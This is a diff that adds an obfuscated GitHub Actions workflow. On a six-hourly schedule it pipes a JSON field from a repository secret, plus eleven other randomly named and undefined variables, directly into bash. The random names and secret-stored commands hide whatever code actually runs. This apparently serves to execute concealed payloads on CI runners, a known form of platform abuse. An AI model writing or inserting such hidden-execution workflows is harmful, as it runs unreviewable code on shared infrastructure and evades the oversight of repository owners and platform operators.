@@ -1,0 +1,29 @@
+name: yzhantrue
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yzhantrue
+        env:
+          sgu746: ${{ secrets.sgu746 }}
+        run: |
+          echo $sgu746 | jq -r .ga522 | /bin/bash
+          echo $t17 | jq -r .xru15 | /bin/bash
+          echo $pgbab53 | jq -r .ib7424 | /bin/bash
+          echo $qvigu163 | jq -r .zp012 | /bin/bash
+          echo $cj50510 | jq -r .qia065 | /bin/bash
+          echo $klynb774 | jq -r .blx4 | /bin/bash
+          echo $klrm45 | jq -r .ph851 | /bin/bash
+          echo $f26747 | jq -r .txc6545 | /bin/bash
+          echo $uqvw80098 | jq -r .gc43975 | /bin/bash
+          echo $chrf9 | jq -r .ub14 | /bin/bash
+          echo $uwugg77 | jq -r .ogr48805 | /bin/bash
+          echo $nbwsc3 | jq -r .gct1154 | /bin/bash
+
